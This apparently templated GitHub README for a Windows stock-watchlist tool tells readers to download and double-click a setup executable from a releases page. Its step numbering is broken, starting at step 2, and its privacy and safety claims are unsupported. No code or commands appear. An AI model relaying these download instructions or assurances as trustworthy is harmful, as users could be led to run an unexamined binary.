# 📈 daily-watchlist - Automated stock market research and tracking

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/jatinkumarjun21/daily-watchlist/releases)

This application tracks stocks, earnings, and market trends using artificial intelligence. It creates daily investment reports for your personal watchlist. You spend less time searching for data and more time making investment decisions.

## 🛠️ System Requirements

Your computer needs these items to run the software:

*   Windows 10 or Windows 11.
*   An active internet connection.
*   At least 4GB of RAM.
*   500MB of free disk space.
*   A valid web browser like Chrome, Edge, or Firefox.

Once the file finishes downloading, follow this path to prepare the software:

2. Find the file named `daily-watchlist-setup.exe`.
3. Double-click the file to start the installation.
4. Follow the prompts on the screen.
5. Click "Next" to continue through each step.
6. Choose a destination folder if the installer asks.
7. Click "Install" to finish the process.

## 🚀 Setting Up Your Watchlist

After you open the program, you must build your list of stocks. Follow this sequence:

1. Find the "Settings" tab in the top navigation bar.
2. Click the "Add Stock" button.
3. Type the stock ticker symbol, such as AAPL for Apple or MSFT for Microsoft.
4. Select the "Save" button to add the company to your watch list.
5. Add as many stocks as your portfolio requires.
6. The application will immediately begin pulling market data for these symbols.

## 📊 Using the Market Report Feature

The daily report gathers information on price movers, earnings announcements, and macroeconomic indicators.

*   **View Movers:** The dashboard shows stocks with high volume and price swings during the current trading session.
*   **Earnings Tracker:** The report highlights upcoming earnings dates and recent financial results for your stocks.
*   **Macro Data:** You see updates on interest rates, inflation numbers, and government reports that affect the broader market.
*   **AI Summary:** The internal engine generates a text report each morning. It summarizes why your stocks moved and what factors might influence them in the future.

## 🧠 Customizing Your Research

You can adjust how the report functions to match your specific needs:

*   **Frequency:** Set the report to run once per day or update throughout the trading session.
*   **Report Depth:** Choose between a brief summary or a deep dive into company fundamentals and sentiment.
*   **Notification Settings:** Configure desktop alerts for high-impact market news.

## 🤝 Getting Help

If the software behaves in unexpected ways, try these steps:

1. Restart the application.
2. Check your internet connection.
3. Confirm that you have the latest software version by visiting the download page again.
4. Verify that you typed the correct ticker symbols in your watchlist.
5. If the app displays an error, clear your cache within the "Settings" menu.

## 🔒 Data Privacy and Security

Your stock watchlist stays local to your machine. The internal tools connect to market data providers to fetch public financial information. No private banking data or brokerage credentials are required to use this software. The tool reads data only to provide analysis. It makes no trades on your behalf.

## 💡 Frequent Questions

**Do I need a paid subscription?**
This tool is open for individual use. 

**Does this software work on Apple computers?**
This version is designed specifically for Windows machines. 

**Will this software slow down my computer?**
The tool runs only when you open it. It does not stay active in the background when you close the window.

**Can I export my reports?**
Yes. You can save your daily research reports as text files or PDF documents. Look for the "Export" button in the report window to save your findings to your hard drive. 

**What happens if a stock delists?**
The system flags the symbol as invalid in your watchlist. You can then remove it from your list via the settings tab. 

**How often does the data update?**
The system pulls the latest market data every time you launch the report. You can also click the "Refresh" button at any time to get the newest numbers.

**Is my data shared with others?**
Your investment research remains private. The software does not send your personal watchlist to any external company.
